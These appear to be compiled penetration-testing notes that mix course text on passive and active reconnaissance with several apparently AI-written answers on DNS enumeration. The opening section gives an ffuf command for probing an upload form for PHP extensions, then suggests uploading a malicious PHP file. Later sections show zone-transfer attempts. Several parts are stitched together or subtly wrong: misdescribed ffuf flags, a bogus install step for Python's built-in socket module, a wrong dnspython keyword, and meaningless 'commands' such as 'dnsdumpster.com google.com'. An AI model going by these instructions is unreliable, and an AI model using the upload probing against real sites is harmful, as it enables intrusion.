<h2 id="using-ffuf-to-fuzz-a-form-with-a-file-field-for-php-extensions"><a class="header" href="#using-ffuf-to-fuzz-a-form-with-a-file-field-for-php-extensions">Using ffuf to fuzz a form with a 'file' field for PHP extensions</a></h2>
<p>Here's an example of how you can use ffuf to fuzz a form with a 'file' field that allows uploading PHP files and test different extensions:</p>
<p><strong>1. Setting up the command:</strong></p>
<pre><code>ffuf -u \&quot;https://example.com/upload\&quot; -w wordlist.txt -H \&quot;Content-Type: multipart/form-data\&quot; -d \&quot;file=@FUZZ\&quot; -D \&quot;FUZZ:0\&quot; -t 100
</code></pre>
<p><strong>Explanation of the options:</strong></p>
<ul>
<li><code>-u</code>: This specifies the URL of the form you want to fuzz.</li>
<li><code>-w wordlist.txt</code>: This specifies the wordlist containing the PHP extensions you want to test (e.g., &quot;php&quot;, &quot;phtml&quot;, &quot;php3&quot;).</li>
<li><code>-H</code>: This sets the HTTP header for the request. Here, we set it to &quot;Content-Type: multipart/form-data&quot; as most file upload forms use this content type.</li>
<li><code>-d</code>: This specifies the data to be sent with the POST request. Here, we use &quot;@FUZZ&quot; to denote the file field and substitute it with the extensions from the wordlist.</li>
<li><code>-D</code>: This defines a custom variable named &quot;FUZZ&quot;. The value of the variable will be taken from the current line of the wordlist.</li>
<li><code>-t</code>: This specifies the number of threads to use for sending requests. You can adjust this value based on your system resources and desired speed.</li>
</ul>
<p><strong>2. Preparing the wordlist:</strong></p>
<p>Create a file named <code>wordlist.txt</code> and add the list of PHP extensions you want to test, one extension per line. For example:</p>
<pre><code>php
phtml
php3
</code></pre>
<p><strong>3. Running the command:</strong></p>
<p>Save the command above in a file named <code>fuzz.sh</code> and make it executable using <code>chmod +x fuzz.sh</code>. Then, run the command:</p>
<pre><code>./fuzz.sh
</code></pre>
<p>This will start sending requests to the form with the different extensions from the wordlist.</p>
<p><strong>4. Analyzing the results:</strong></p>
<p>ffuf will display the status code of each request. If the server returns a 200 status code for a specific extension, it indicates that the extension might be allowed. You can then investigate further by trying to upload a malicious PHP file with that extension.</p>
<p><strong>Additional notes:</strong></p>
<ul>
<li>This is a basic example, and you can customize the command further by adding additional options and filters.</li>
<li>Be sure to test on a safe environment before attempting this on a live website.</li>
<li>Do not use this technique for malicious purposes.</li>

<p>This room expects the user to have a working knowledge of computer networks. If you like to brush up on this topic, you are encouraged to study the Network Fundamentals module first.</p>
<p>Before the dawn of computer systems and networks, in the Art of War, Sun Tzu taught, “If you know the enemy and know yourself, your victory will not stand in doubt.” If you are playing the role of an attacker, you need to gather information about your target systems. If you are playing the role of a defender, you need to know what your adversary will discover about your systems and networks.</p>
<p>Reconnaissance (recon) can be defined as a preliminary survey to gather information about a target. It is the first step in The Unified Kill Chain to gain an initial foothold on a system. We divide reconnaissance into:</p>
<p>Passive Reconnaissance
Active Reconnaissance
In passive reconnaissance, you rely on publicly available knowledge. It is the knowledge that you can access from publicly available resources without directly engaging with the target. Think of it like you are looking at target territory from afar without stepping foot on that territory.</p>
<p>Passive reconnaissance activities include many activities, for instance:</p>
<p>Looking up DNS records of a domain from a public DNS server.
Checking job ads related to the target website.
Reading news articles about the target company.
Active reconnaissance, on the other hand, cannot be achieved so discreetly. It requires direct engagement with the target. Think of it like you check the locks on the doors and windows, among other potential entry points.</p>
<p>Examples of active reconnaissance activities include:</p>
<p>Connecting to one of the company servers such as HTTP, FTP, and SMTP.
Calling the company in an attempt to get information (social engineering).
Entering company premises pretending to be a repairman.
Considering the invasive nature of active reconnaissance, one can quickly get into legal trouble unless one obtains proper legal authorisation.</p>
<p>WHOIS is a request and response protocol that follows the RFC 3912 specification. A WHOIS server listens on TCP port 43 for incoming requests. The domain registrar is responsible for maintaining the WHOIS records for the domain names it is leasing. The WHOIS server replies with various information related to the domain requested. Of particular interest, we can learn:</p>
<p>Registrar: Via which registrar was the domain name registered?
Contact info of registrant: Name, organization, address, phone, among other things. (unless made hidden via a privacy service)
Creation, update, and expiration dates: When was the domain name first registered? When was it last updated? And when does it need to be renewed?
Name Server: Which server to ask to resolve the domain name?
To get this information, we need to use a whois client or an online service. Many online services provide whois information; however, it is generally faster and more convenient to use your local whois client. Using the AttackBox (or your local Linux machine, such as Parrot or Kali), you can easily access your whois client on the terminal. The syntax is whois DOMAIN_NAME, where DOMAIN_NAME is the domain about which you are trying to get more information. Consider the following example executing whois tryhackme.com.</p>
<p>Terminal

We can see plenty of information; we will inspect them in the order displayed. First, we notice that we were redirected to whois.namecheap.com to get our information. In this case and at the time being, namecheap.com is maintaining the WHOIS record for this domain name. Furthermore, we can see the creation date along with the last-update date and expiration date.</p>
<p>Next, we obtain information about the registrar and the registrant. We can find the registrant’s name and contact information unless they are using some privacy service. Although not displayed above, we get the admin and tech contacts for this domain. Finally, we see the domain name servers that we should query if we have any DNS records to look up.</p>
<p>The information collected can be inspected to find new attack surfaces, such as social engineering or technical attacks. For instance, depending on the scope of the penetration test, you might consider an attack against the email server of the admin user or the DNS servers, assuming they are owned by your client and fall within the scope of the penetration test.</p>
<p>It is important to note that due to automated tools abusing WHOIS queries to harvest email addresses, many WHOIS services take measures against this. They might redact email addresses, for instance. Moreover, many registrants subscribe to privacy services to avoid their email addresses being harvested by spammers and keep their information private.</p>
<p>On the AttackBox, open the terminal and run the whois tryhackme.com command to get the information you need to answer the following questions.</p>
<p>In the previous task, we used the WHOIS protocol to get various information about the domain name we were looking up. In particular, we were able to get the DNS servers from the registrar.</p>
<p>Find the IP address of a domain name using nslookup, which stands for Name Server Look Up. You need to issue the command nslookup DOMAIN_NAME, for example, nslookup tryhackme.com. Or, more generally, you can use nslookup OPTIONS DOMAIN_NAME SERVER. These three main parameters are:</p>
<p>OPTIONS contains the query type as shown in the table below. For instance, you can use A for IPv4 addresses and AAAA for IPv6 addresses.
DOMAIN_NAME is the domain name you are looking up.
SERVER is the DNS server that you want to query. You can choose any local or public DNS server to query. Cloudflare offers 1.1.1.1 and 1.0.0.1, Google offers 8.8.8.8 and 8.8.4.4, and Quad9 offers 9.9.9.9 and 149.112.112.112. There are many more public DNS servers that you can choose from if you want alternatives to your ISP’s DNS servers.
| Query type | Result           |
|------------|------------------|
| A          | IPv4 Addresses   |
| AAAA       | IPv6 Addresses   |
| CNAME      | Canonical Name   |
| MX         | Mail Servers     |
| SOA        | Start of Authority |
| TXT        | TXT Records      |
For instance, nslookup -type=A tryhackme.com 1.1.1.1 (or nslookup -type=a tryhackme.com 1.1.1.1 as it is case-insensitive) can be used to return all the IPv4 addresses used by tryhackme.com.</p>
<p>Terminal
user@TryHackMe$ nslookup -type=A tryhackme.com 1.1.1.1
Server:		1.1.1.1
Address:	1.1.1.1#53</p>
<p>Non-authoritative answer:
Name:	tryhackme.com
Address: 172.67.69.208
Name:	tryhackme.com
Address: 104.26.11.229
Name:	tryhackme.com
Address: 104.26.10.229
The A and AAAA records are used to return IPv4 and IPv6 addresses, respectively. This lookup is helpful to know from a penetration testing perspective. In the example above, we started with one domain name, and we obtained three IPv4 addresses. Each of these IP addresses can be further checked for insecurities, assuming they lie within the scope of the penetration test.</p>
<p>Let’s say you want to learn about the email servers and configurations for a particular domain. You can issue nslookup -type=MX tryhackme.com. Here is an example:</p>
<p>Terminal
user@TryHackMe$ nslookup -type=MX tryhackme.com
Server:		127.0.0.53
Address:	127.0.0.53#53</p>
<p>Non-authoritative answer:
tryhackme.com	mail exchanger = 5 alt1.aspmx.l.google.com.
tryhackme.com	mail exchanger = 1 aspmx.l.google.com.
tryhackme.com	mail exchanger = 10 alt4.aspmx.l.google.com.
tryhackme.com	mail exchanger = 10 alt3.aspmx.l.google.com.
tryhackme.com	mail exchanger = 5 alt2.aspmx.l.google.com.
We can see that tryhackme.com’s current email configuration uses Google. Since MX is looking up the Mail Exchange servers, we notice that when a mail server tries to deliver email @tryhackme.com, it will try to connect to the aspmx.l.google.com, which has order 1. If it is busy or unavailable, the mail server will attempt to connect to the next in order mail exchange servers, alt1.aspmx.l.google.com or alt2.aspmx.l.google.com.</p>
<p>Google provides the listed mail servers; therefore, we should not expect the mail servers to be running a vulnerable server version. However, in other cases, we might find mail servers that are not adequately secured or patched.</p>
<p>Such pieces of information might prove valuable as you continue the passive reconnaissance of your target. You can repeat similar queries for other domain names and try different types, such as -type=txt. Who knows what kind of information you might discover along your way!</p>
<p>For more advanced DNS queries and additional functionality, you can use dig, the acronym for “Domain Information Groper,” if you are curious. Let’s use dig to look up the MX records and compare them to nslookup. We can use dig DOMAIN_NAME, but to specify the record type, we would use dig DOMAIN_NAME TYPE. Optionally, we can select the server we want to query using dig @SERVER DOMAIN_NAME TYPE.</p>
<p>SERVER is the DNS server that you want to query.
DOMAIN_NAME is the domain name you are looking up.
TYPE contains the DNS record type, as shown in the table provided earlier.
Terminal
user@TryHackMe$ dig tryhackme.com MX</p>
<p>; &lt;&lt;&gt;&gt; DiG 9.16.19-RH &lt;&lt;&gt;&gt; tryhackme.com MX
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;</p>
<p>A quick comparison between the output of nslookup and dig shows that dig returned more information, such as the TTL (Time To Live) by default. If you want to query a 1.1.1.1 DNS server, you can execute dig @1.1.1.1 tryhackme.com MX.</p>
<p>Using the AttackBox, open the terminal and use the nslookup or dig command to get the information you need to answer the following question.</p>
<p>DNS lookup tools, such as nslookup and dig, cannot find subdomains on their own. The domain you are inspecting might include a different subdomain that can reveal much information about the target. For instance, if tryhackme.com has the subdomains wiki.tryhackme.com and webmail.tryhackme.com, you want to learn more about these two as they can hold a trove of information about your target. There is a possibility that one of these subdomains has been set up and is not updated regularly. Lack of proper regular updates usually leads to vulnerable services. But how can we know that such subdomains exist?</p>
<p>We can consider using multiple search engines to compile a list of publicly known subdomains. One search engine won’t be enough; moreover, we should expect to go through at least tens of results to find interesting data. After all, you are looking for subdomains that are not explicitly advertised, and hence it is not necessary to make it to the first page of search results. Another approach to discover such subdomains would be to rely on brute-forcing queries to find which subdomains have DNS records.</p>
<p>To avoid such a time-consuming search, one can use an online service that offers detailed answers to DNS queries, such as DNSDumpster. If we search DNSDumpster for tryhackme.com, we will discover the subdomain blog.tryhackme.com, which a typical DNS query cannot provide. In addition, DNSDumpster will return the collected DNS information in easy-to-read tables and a graph. DNSDumpster will also provide any collected information about listening servers.</p>
<p>We will search for tryhackme.com on DNSDumpster to give you a glimpse of the expected output. Among the results, we got a list of DNS servers for the domain we are looking up. DNSDumpster also resolved the domain names to IP addresses and even tried to geolocate them. We can also see the MX records; DNSDumpster resolved all five mail exchange servers to their respective IP addresses and provided more information about the owner and location. Finally, we can see TXT records. Practically a single query was enough to retrieve all this information.</p>
<p>DNSDumpster will also represent the collected information graphically. DNSDumpster displayed the data from the table earlier as a graph. You can see the DNS and MX branching to their respective servers and also showing the IP addresses.</p>
<p>There is currently a beta feature that allows you to export the graph as well. You can manipulate the graph and move blocks around if needed.</p>
<p>Use the web browser on the AttackBox, or your system, to answer the following question.</p>
<p>When you are tasked to run a penetration test against specific targets, as part of the passive reconnaissance phase, a service like Shodan.io can be helpful to learn various pieces of information about the client’s network, without actively connecting to it. Furthermore, on the defensive side, you can use different services from Shodan.io to learn about connected and exposed devices belonging to your organization.</p>
<p>Shodan.io tries to connect to every device reachable online to build a search engine of connected “things” in contrast with a search engine for web pages. Once it gets a response, it collects all the information related to the service and saves it in the database to make it searchable. Consider the saved record of one of tryhackme.com’s servers.</p>
<p>This record shows a web server; however, as mentioned already, Shodan.io collects information related to any device it can find connected online. Searching for tryhackme.com on Shodan.io will display at least the record shown in the screenshot above. Via this Shodan.io search result, we can learn several things related to our search, such as:</p>
<p>IP address
hosting company
geographic location
server type and version
You may also try searching for the IP addresses you have obtained from DNS lookups. These are, of course, more subject to change. On their help page, you can learn about all the search options available at Shodan.io, and you are encouraged to join TryHackMe’s Shodan.io.</p>
<p>It would be best to visit Shodan.io to answer the following questions; however, note that you can find the answers on Shodan.io without needing a premium account.</p>
<p>In this room, we focused on passive reconnaissance. In particular, we covered command-line tools, whois, nslookup, and dig. We also discussed two publicly available services DNSDumpster and Shodan.io. The power of such tools is that you can collect information about your targets without directly connecting to them. Moreover, the trove of information you may find using such tools can be massive once you master the search options and get used to reading the results.</p>
<p>Purpose	Commandline Example

<p>DNS enumeration, also known as DNS information gathering or DNS reconnaissance, is a common technique used by cybersecurity professionals and attackers to gather information about a target's DNS infrastructure. In this response, I'll provide you with a Python script that you can use to perform basic DNS enumeration using the <code>socket</code> library. Please note that performing DNS enumeration on systems you don't own or have permission to test is illegal and unethical. Always ensure you have the necessary permissions before conducting any security testing.</p>
<p>Here's a Python script for basic DNS enumeration:</p>
<pre><code class="language-python">import socket

def get_dns_records(target_domain):
    try:
        # Resolve the A (IPv4) record for the target domain
        ipv4_address = socket.gethostbyname(target_domain)
        print(f'A (IPv4) Record: {ipv4_address}')

        # Resolve the AAAA (IPv6) record for the target domain (if available)
        try:
            ipv6_address = socket.getaddrinfo(target_domain, None, socket.AF_INET6)
            print(f'AAAA (IPv6) Record: {ipv6_address[0][4][0]}')
        except socket.gaierror:
            print('No AAAA (IPv6) Record found.')

        # Perform a reverse DNS lookup (PTR record) for the IP address
        try:
            reverse_dns = socket.gethostbyaddr(ipv4_address)
            print(f'PTR Record: {reverse_dns[0]}')
        except socket.herror:
            print('No PTR Record found.')

    except socket.gaierror:
        print('DNS resolution failed. Check the target domain.')

if __name__ == &quot;__main__&quot;:
    target_domain = input(&quot;Enter the target domain: &quot;)
    get_dns_records(target_domain)
</code></pre>
<p>This script performs the following DNS enumeration tasks:</p>
<ol>
<li>Resolves the A (IPv4) record for the target domain.</li>
<li>Optionally, resolves the AAAA (IPv6) record if it's available.</li>
<li>Performs a reverse DNS lookup (PTR record) for the resolved IP address.</li>
</ol>
<p>Make sure you have the <code>socket</code> library installed in your Python environment. You can run this script by providing the target domain when prompted. It will provide you with information about the A record, AAAA record (if available), and the PTR record.</p>
<p>Remember to use this script responsibly and only on systems you have permission to test. Unauthorized DNS enumeration is considered unethical and may be illegal.</p>
<p>To perform DNS enumeration using Python, you can use the <code>dnspython</code> library. This library provides a number of functions that you can use to query DNS servers and retrieve DNS records.</p>
<p>To get started, you will need to install the <code>dnspython</code> library. You can do this using the following command:</p>
<pre><code>pip install dnspython
</code></pre>
<p>Once the <code>dnspython</code> library is installed, you can import it into your Python script.</p>
<pre><code class="language-python">import dns.resolver
</code></pre>
<p>Next, you will need to create a <code>dns.resolver.Resolver</code> object. This object will be used to send DNS queries.</p>
<pre><code class="language-python">resolver = dns.resolver.Resolver()
</code></pre>
<p>Now, you can start performing DNS enumeration. To enumerate all of the DNS records for a given domain, you can use the <code>resolver.resolve()</code> function. This function will return a list of DNS records for the specified domain.</p>
<p>For example, to enumerate all of the DNS records for the <code>google.com</code> domain, you would use the following code:</p>
<pre><code class="language-python">domain = &quot;google.com&quot;
records = resolver.resolve(domain)
</code></pre>
<p>The <code>records</code> variable will now contain a list of DNS records for the <code>google.com</code> domain. You can print the list of records to the console using the following code:</p>
<pre><code class="language-python">for record in records:
    print(record)
</code></pre>
<p>You can also use the <code>resolver.resolve()</code> function to enumerate specific types of DNS records. For example, to enumerate all of the A records for the <code>google.com</code> domain, you would use the following code:</p>
<pre><code class="language-python">record_type = &quot;A&quot;
records = resolver.resolve(domain, record_type=record_type)
</code></pre>
<p>The <code>records</code> variable will now contain a list of A records for the <code>google.com</code> domain.</p>
<p>You can also use the <code>dnspython</code> library to perform other types of DNS enumeration, such as subdomain enumeration and zone transfer enumeration.</p>
<p>Here is an example of a simple Python script that you can use to perform DNS enumeration:</p>
<pre><code class="language-python">import dns.resolver

def dns_enumerate(domain):
    resolver = dns.resolver.Resolver()

    # Enumerate all of the DNS records for the given domain
    records = resolver.resolve(domain)

    # Print the list of records to the console
    for record in records:
        print(record)

if __name__ == &quot;__main__&quot;:
    domain = &quot;google.com&quot;
    dns_enumerate(domain)
</code></pre>
<p>You can run this script using the following command:</p>
<pre><code>python dns_enumerate.py
</code></pre>
<p>This will print a list of all of the DNS records for the <code>google.com</code> domain to the console.</p>
<p>You can modify this script to perform other types of DNS enumeration, such as subdomain enumeration and zone transfer enumeration.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="dns-enumeration-using-dig"><a class="header" href="#dns-enumeration-using-dig">DNS Enumeration using dig</a></h1>
<p>The <code>dig</code> command is a powerful tool for performing DNS enumeration. It can be used to query DNS servers and retrieve a wide variety of DNS records, including A records, AAAA records, CNAME records, MX records, NS records, and TXT records.</p>
<p>To perform DNS enumeration using the <code>dig</code> command, you can use the following steps:</p>
<ol>
<li>Open a terminal window.</li>
<li>Type the following command to query a DNS server for the A record of a given domain name:</li>
</ol>
<pre><code>dig &lt;domain name&gt; A
</code></pre>
<ol start="3">
<li>Type the following command to query a DNS server for the AAAA record of a given domain name:</li>
</ol>
<pre><code>dig &lt;domain name&gt; AAAA
</code></pre>
<ol start="4">
<li>Type the following command to query a DNS server for the CNAME record of a given domain name:</li>
</ol>
<pre><code>dig &lt;domain name&gt; CNAME
</code></pre>
<ol start="5">
<li>Type the following command to query a DNS server for the MX record of a given domain name:</li>
</ol>
<pre><code>dig &lt;domain name&gt; MX
</code></pre>
<ol start="6">
<li>Type the following command to query a DNS server for the NS record of a given domain name:</li>
</ol>
<pre><code>dig &lt;domain name&gt; NS
</code></pre>
<ol start="7">
<li>Type the following command to query a DNS server for the TXT record of a given domain name:</li>
</ol>
<pre><code>dig &lt;domain name&gt; TXT
</code></pre>
<p>You can also use the <code>dig</code> command to perform more complex DNS enumeration tasks, such as subdomain enumeration and zone transfer enumeration.</p>
<p>Here are some examples of how to use the <code>dig</code> command to perform DNS enumeration:</p>
<pre><code># Query a DNS server for the A record of the domain name google.com
dig google.com A

# Query a DNS server for the AAAA record of the domain name google.com
dig google.com AAAA

# Query a DNS server for the CNAME record of the domain name mail.google.com
dig mail.google.com CNAME

# Query a DNS server for the MX record of the domain name google.com
dig google.com MX

# Query a DNS server for the NS record of the domain name google.com
dig google.com NS

# Query a DNS server for the TXT record of the domain name google.com
dig google.com TXT
</code></pre>
<p>You can use the output of the <code>dig</code> command to gather information about a domain name and its associated resources. This information can be useful for a variety of purposes, such as penetration testing, security research, and network troubleshooting.</p>
<p>I hope this helps!</p>
<p>DNS enumeration can be performed using the <code>dig</code> command, which is a powerful tool for querying DNS information. The <code>dig</code> command allows you to retrieve various DNS records for a domain. Below are examples of using <code>dig</code> for DNS enumeration:</p>
<ol>
<li>
<p><strong>Querying for the A (IPv4) Record:</strong></p>
<p>To retrieve the A record for a domain, which maps the domain name to its IPv4 address, use the following command:</p>
<pre><code class="language-bash">dig A example.com
</code></pre>
</li>
<li>
<p><strong>Querying for the AAAA (IPv6) Record:</strong></p>
<p>To retrieve the AAAA record for a domain, which maps the domain name to its IPv6 address (if available), use this command:</p>
<pre><code class="language-bash">dig AAAA example.com
</code></pre>
</li>
<li>
<p><strong>Querying for the MX Record:</strong></p>
<p>The MX record specifies the mail servers responsible for receiving email for a domain. To retrieve the MX record for a domain, use this command:</p>
<pre><code class="language-bash">dig MX example.com
</code></pre>
</li>
<li>
<p><strong>Querying for the TXT Record:</strong></p>
<p>TXT records store arbitrary text data and are used for various purposes, including domain verification and SPF records. To retrieve the TXT record for a domain, use this command:</p>
<pre><code class="language-bash">dig TXT example.com
</code></pre>
</li>
<li>
<p><strong>Querying for the NS (Name Server) Record:</strong></p>
<p>The NS record specifies the authoritative name servers for a domain. To retrieve the NS record for a domain, use this command:</p>
<pre><code class="language-bash">dig NS example.com
</code></pre>
</li>
<li>
<p><strong>Zone Transfer (AXFR):</strong></p>
<p>Zone transfers can be used to enumerate all the DNS records for a domain. However, zone transfers are typically restricted to authorized users. To attempt a zone transfer (AXFR), you can use the following command:</p>
<pre><code class="language-bash">dig AXFR example.com @dns-server.example.com
</code></pre>
<p>Replace <code>dns-server.example.com</code> with the authoritative DNS server for the domain. Note that this may not work unless you have permission to perform a zone transfer.</p>
</li>
</ol>
<p>The <code>dig</code> command is a versatile tool for DNS enumeration, and it can provide a wide range of DNS-related information. It's important to use it responsibly and only on systems for which you have permission to query DNS information. Unauthorized or excessive DNS enumeration can be considered unethical or even malicious.</p>

<p>You can use the <code>nslookup</code> command to perform basic DNS enumeration by querying DNS records for a specific domain. Here are some examples of how to use <code>nslookup</code> for DNS enumeration:</p>
<ol>
<li>
<p><strong>Querying for the A (IPv4) Record:</strong>
To retrieve the A record for a domain (mapping the domain name to its IPv4 address), use the following command:</p>
<pre><code class="language-bash">nslookup -type=A example.com
</code></pre>
</li>
<li>
<p><strong>Querying for the AAAA (IPv6) Record:</strong>
To retrieve the AAAA record for a domain (mapping the domain name to its IPv6 address, if available), use this command:</p>
<pre><code class="language-bash">nslookup -type=AAAA example.com
</code></pre>
</li>
<li>
<p><strong>Querying for the MX Record:</strong>
To retrieve the MX record for a domain (specifying the mail servers responsible for receiving email for the domain), use this command:</p>
<pre><code class="language-bash">nslookup -type=MX example.com
</code></pre>
</li>
<li>
<p><strong>Querying for the TXT Record:</strong>
To retrieve the TXT record for a domain (which stores arbitrary text data used for various purposes), use this command:</p>
<pre><code class="language-bash">nslookup -type=TXT example.com
</code></pre>
</li>
<li>
<p><strong>Querying for the NS (Name Server) Record:</strong>
To retrieve the NS record for a domain (specifying the authoritative name servers for the domain), use this command:</p>
<pre><code class="language-bash">nslookup -type=NS example.com
</code></pre>
</li>
<li>
<p><strong>Reverse DNS Lookup (PTR Record):</strong>
To perform a reverse DNS lookup and find the domain name associated with an IP address, use this command:</p>
<pre><code class="language-bash">nslookup IP_address
</code></pre>
<p>Replace <code>IP_address</code> with the actual IP address you want to look up.</p>
</li>
</ol>
<p>Remember to replace <code>example.com</code> and <code>IP_address</code> with the specific domain or IP address you want to query. Additionally, please ensure that you have the necessary permissions to perform DNS enumeration on the target domain. Unauthorized DNS enumeration is considered unethical and may be illegal. Always use this knowledge responsibly and for legitimate purposes.</p>
<p>To perform DNS enumeration using <code>nslookup</code>, you can use the following steps:</p>
<ol>
<li>Open a terminal window.</li>
<li>Type the following command to query a DNS server for the A record of a given domain name:</li>

<p>You can use the output of <code>nslookup</code> to gather information about a domain name and its associated resources. This information can be useful for a variety of purposes, such as penetration testing, security research, and network troubleshooting.</p>
<p><strong>Note:</strong> <code>nslookup</code> is a less powerful DNS enumeration tool than <code>dig</code>. It does not support as many DNS record types and it does not have as many features. However, <code>nslookup</code> is a more widely available tool, so it is a good option to use if <code>dig</code> is not available.</p>

<div style="break-before: page; page-break-before: always;"></div><h1 id="dns-enumeration-using-other-tools"><a class="header" href="#dns-enumeration-using-other-tools">DNS Enumeration using other tools</a></h1>
<p>DNS enumeration is an important aspect of information gathering in the field of cybersecurity and network analysis. However, it's crucial to note that DNS enumeration should only be performed on systems and networks for which you have permission and are authorized to conduct such activities. Unauthorized DNS enumeration is unethical and may be illegal. Here are some additional methods for DNS enumeration:</p>
<ol>
<li>
<p><strong>DNS Zone Transfers (AXFR):</strong> Zone transfers can be used to retrieve a list of all DNS records for a particular domain. This method can provide comprehensive information about the domain's infrastructure. To attempt a zone transfer using a tool like <code>nslookup</code>, use the command:</p>
<pre><code class="language-bash">nslookup
&gt; server target-dns-server
&gt; ls -d target-domain
</code></pre>
<p>Be aware that zone transfers are often restricted to authorized users.</p>
</li>
<li>
<p><strong>NSEC and NSEC3 Walking:</strong> In DNSSEC-protected zones, you can perform NSEC and NSEC3 walking to enumerate the existing DNS records. These methods rely on the way NSEC (Next Secure) records are structured to derive information about other domain records.</p>
</li>
<li>
<p><strong>Subdomain Enumeration:</strong> Enumerating subdomains of a domain can be a form of DNS enumeration. Tools like <code>Sublist3r</code>, <code>Amass</code>, <code>Subfinder</code>, and <code>dnsenum</code> are designed to discover subdomains associated with a given domain.</p>
</li>
<li>
<p><strong>Brute-Force Enumeration:</strong> You can perform brute-force DNS enumeration by trying to guess or systematically generate domain names and checking their DNS records. Tools like <code>dnsrecon</code> and <code>Fierce</code> can help with this.</p>
</li>
<li>
<p><strong>Google Dorking:</strong> Using advanced Google search operators, you can search for publicly available DNS records and subdomains associated with a target domain. For example, you can use Google dorks like <code>site:example.com</code> to search for site-specific information.</p>
</li>
<li>
<p><strong>Public DNS Databases:</strong> Public DNS databases and repositories, such as the Common Crawl project, provide information about DNS records and subdomains on the internet.</p>
</li>
<li>
<p><strong>Passive DNS Analysis:</strong> Passive DNS databases like DNSDB, which collect historical DNS data, can be queried to gather information about DNS records over time.</p>
</li>
<li>
<p><strong>Zone Enumeration Tools:</strong> Various tools and scripts are available for automated DNS enumeration, such as <code>dnsrecon</code>, <code>enum4linux</code> (for Windows DNS enumeration), and <code>theHarvester</code>.</p>
</li>
<li>
<p><strong>SNMP Enumeration:</strong> In some cases, Simple Network Management Protocol (SNMP) can be used to enumerate DNS information. This method requires SNMP access to the target device.</p>
</li>
<li>
<p><strong>Social Engineering:</strong> Information about DNS records can sometimes be gathered through social engineering techniques, such as contacting domain registrars, web hosting providers, or company employees who have access to DNS configurations.</p>
</li>
</ol>
<p>Again, it is essential to stress that DNS enumeration should only be conducted on systems and networks where you have explicit permission. Unauthorized or aggressive DNS enumeration can disrupt services, violate legal and ethical standards, and lead to serious consequences. Always follow ethical guidelines and laws when performing any form of DNS enumeration.</p>
<p>Here are some other ways of performing DNS enumeration:</p>
<ul>
<li><strong>Using search engines:</strong> You can use search engines such as Google and Bing to find subdomains and other DNS records for a given domain name. For example, you can search for &quot;subdomains of google.com&quot; or &quot;DNS records for google.com&quot;.</li>
<li><strong>Using DNS enumeration tools:</strong> There are a number of DNS enumeration tools available, such as DNSEnum and Fierce. These tools can be used to automate the process of enumerating DNS records.</li>
<li><strong>Using DNS passive enumeration:</strong> Passive DNS enumeration involves gathering DNS information from publicly available sources, such as DNS caches and DNS archives. This can be done using a variety of tools, such as DNSdumpster and SecurityTrails.</li>
</ul>
<p>Here are some examples of how to use these methods to perform DNS enumeration:</p>
<p><strong>Searching for subdomains using Google:</strong></p>
<pre><code>google subdomains of google.com
</code></pre>
<p><strong>Using DNSEnum to enumerate DNS records:</strong></p>
<pre><code>dnsenum google.com
</code></pre>
<p><strong>Using DNSdumpster to perform passive DNS enumeration:</strong></p>
<pre><code>dnsdumpster.com google.com
</code></pre>
<p>You can use a combination of these methods to gather the most comprehensive information about a domain name and its associated resources.</p>
<p><strong>Additional notes:</strong></p>
<ul>
<li>It is important to note that some of these methods may be considered intrusive, so it is important to obtain permission before performing DNS enumeration on a domain name that you do not own or control.</li>
<li>You should also be aware that some DNS servers may block DNS enumeration attempts, so you may need to try multiple DNS servers to get the most complete results.</li>
</ul>
<p>I hope this helps!</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="active-reconnaissance"><a class="header" href="#active-reconnaissance">Active reconnaissance</a></h1>
<p>In the first room of the Network Security Module, we focused on passive reconnaissance. In this second room, we focus on active reconnaissance and the essential tools related to it. We learn to use a web browser to collect more information about our target. Moreover, we discuss using simple tools such as ping, traceroute, telnet, and nc to gather information about the network, system, and services.</p>
<p>As we learned in the previous room, passive reconnaissance lets you gather information about your target without any kind of direct engagement or connection. You are watching from afar or checking publicly available information.</p>
<p>Active reconnaissance requires you to make some kind of contact with your target. This contact can be a phone call or a visit to the target company under some pretence to gather more information, usually as part of social engineering. Alternatively, it can be a direct connection to the target system, whether visiting their website or checking if their firewall has an SSH port open. Think of it like you are closely inspecting windows and door locks. Hence, it is essential to remember not to engage in active reconnaissance work before getting signed legal authorization from the client.</p>
<p>In this room, we focus on active reconnaissance. Active reconnaissance begins with direct connections made to the target machine. Any such connection might leave information in the logs showing the client IP address, time of the connection, and duration of the connection, among other things. However, not all connections are suspicious. It is possible to let your active reconnaissance appear as regular client activity. Consider web browsing; no one would suspect a browser connected to a target web server among hundreds of other legitimate users. You can use such techniques to your advantage when working as part of the red team (attackers) and don’t want to alarm the blue team (defenders).</p>
<p>In this room, we go through various tools commonly bundled with most operating systems or easily obtainable. We begin with the web browser and its built-in developer tools; furthermore, we show you how a web browser can be “armed” to become an efficient reconnaissance framework. Afterwards, we discuss other benign tools such as ping, traceroute, and telnet. All these programs require connection to the target, and hence our activities would fall under active reconnaissance.</p>
<p>This room is of interest to anyone who wants to become familiar with essential tools and see how they can use them in active reconnaissance. The web browser developer tools might take some effort to gain familiarity, although it offers a graphical user interface. The command-line tools covered are relatively straightforward to use.</p>
<p>The web browser can be a convenient tool, especially that it is readily available on all systems. There are several ways where you can use a web browser to gather information about a target.</p>
<p>On the transport level, the browser connects to:</p>
<p>TCP port 80 by default when the website is accessed over HTTP
TCP port 443 by default when the website is accessed over HTTPS
Since 80 and 443 are default ports for HTTP and HTTPS, the web browser does not show them in the address bar. However, it is possible to use custom ports to access a service. For instance, https://127.0.0.1:8834/ will connect to 127.0.0.1 (localhost) at port 8834 via HTTPS protocol. If there is an HTTPS server listening on that port, we will receive a web page.</p>
<p>While browsing a web page, you can press Ctrl+Shift+I on a PC or Option + Command + I (⌥ + ⌘ + I) on a Mac to open the Developer Tools on Firefox. Similar shortcuts will also get you started with Google Chrome or Chromium. Developer Tools lets you inspect many things that your browser has received and exchanged with the remote server. For instance, you can view and even modify the JavaScript (JS) files, inspect the cookies set on your system and discover the folder structure of the site content.</p>
<p>Below is a screenshot of Firefox Developer Tools. Chrome DevTools is quite similar.</p>
<p>There are also plenty of add-ons for Firefox and Chrome that can help in penetration testing. Here are a few examples:</p>
<p>FoxyProxy lets you quickly change the proxy server you are using to access the target website. This browser extension is convenient when you are using a tool such as Burp Suite or if you need to switch proxy servers regularly. You can get FoxyProxy for Firefox from here.
